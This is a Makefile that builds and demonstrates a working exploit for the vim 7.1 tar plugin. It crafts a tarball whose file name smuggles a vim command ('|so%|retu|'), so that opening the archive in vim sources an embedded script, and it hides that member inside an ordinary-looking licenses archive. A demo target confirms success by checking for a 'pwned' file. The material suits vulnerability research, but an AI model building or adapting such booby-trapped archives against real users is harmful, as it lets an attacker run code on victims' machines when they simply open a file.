# Makefile for rdancer's exploit of the vim 7.1 tar plugin
#
# There are two interested targets:
#
#	(1) make sploit
#
#	    Compiles the exploit.
#
#	(2) make demo
#
#	    This is the default target.  Runs ``make sploit'', adds contents to
#	    the exploit tarball, and opens it in vim (thereby running the
#	    exploit)

#
# Variables
#

# The name of the compiled exploit.  The single quotes are there to finish and
# restart the quoting in the script we're exploiting.  INITIAL and FINAL are
# variable within limits
INITIAL = "foo"
FINAL = "bar"
TARBALL_NAME = "sploit/$(INITIAL)'|so%|retu|'$(FINAL).tar"
# Necessary when TARBALL_NAME contains colons
TAR_OPTIONS = --force-local

# Name of the principal archive member that contains the exploit itself
# This file name are the very first characters of the tarball file, so let it
# be a comment introduction
MEMBER_NAME = "\""

# Random string we use in names to prevent name collision
export MAGIC := $(shell env LANG=C LC_CTYPE=C LC_ALL=C tr -dc 'A-Za-z' \
		< /dev/urandom | head -c 16)
# Make it static if we're short on randomness
#export MAGIC = "wMkcvujyyXckKeLq"

# Be very verbose -- use for debugging
#VIM_OPTIONS := -V16

# Use this file's contents to ammend the exploit tarball
HOST_TARBALL ?= "licenses.tar"

# This is the name of the file created by the exploit
PWN_FILE = "pwned"

#
# Targets
#

# Open the exploit in vim
.PHONY: demo
demo: sploit
	rm -f $(PWN_FILE)
	vim $(VIM_OPTIONS) -- $(TARBALL_NAME)
	if test -f $(PWN_FILE); then \
		echo "Exploit worked: we're pwned"; \
	else \
		echo "Exploit didn't work."; \
	fi

# Open the exploit in vim, non-interactively
.PHONY: test
test: VIM_OPTIONS := ${VIM_OPTIONS} +:q
test: demo

# Compile the exploit
.PHONY: sploit
sploit: exploit.vim plugin licenses.tar
	rm -f $(MEMBER_NAME)
	# This newline will go right after the NUL padding -- otherwise the
	# first line of the script would be part of the initial comment.
	echo > $(MEMBER_NAME)
	# Expand all occurrences of VERY_MAGIC
	sed "s#VERY_MAGIC#$(MAGIC)#g" < exploit.vim >> $(MEMBER_NAME)
	# Append the redefinition of the tar plugin
	cat plugin/tar.vim.ready       >> $(MEMBER_NAME)
	echo                           >> $(MEMBER_NAME)
	cat plugin/tarPlugin.vim.ready >> $(MEMBER_NAME)
	# Make vim ignore rest of file (even utter garbage)
	echo -e '\nfinish'             >> $(MEMBER_NAME)
	# Create the archive/vim script
	mkdir -p sploit
	tar cf $(TARBALL_NAME) $(TAR_OPTIONS) -- $(MEMBER_NAME)
	tar -Af $(TARBALL_NAME) $(TAR_OPTIONS) -- $(HOST_TARBALL)
	# Create a symlink
	rm -f exploit
	ln -s -- $(TARBALL_NAME) exploit

#
# Following targets aren't of interest on their own
#

# Remove files we can make
.PHONY: clean
clean:
	rm -f $(TARBALL_NAME)
	rm -f $(MEMBER_NAME)
	rm -f licenses.tar
	rm -f $(PWN_FILE)
	rm -f exploit
	make -C plugin clean

.PHONY: test_magic
test_magic: 
	echo $(MAGIC)

.PHONY: plugin
plugin:
	make -C plugin

# Create host tarball
.PHONY: licenses.tar
licenses.tar: licenses
	tar cf licenses.tar $(TAR_OPTIONS) -- licenses
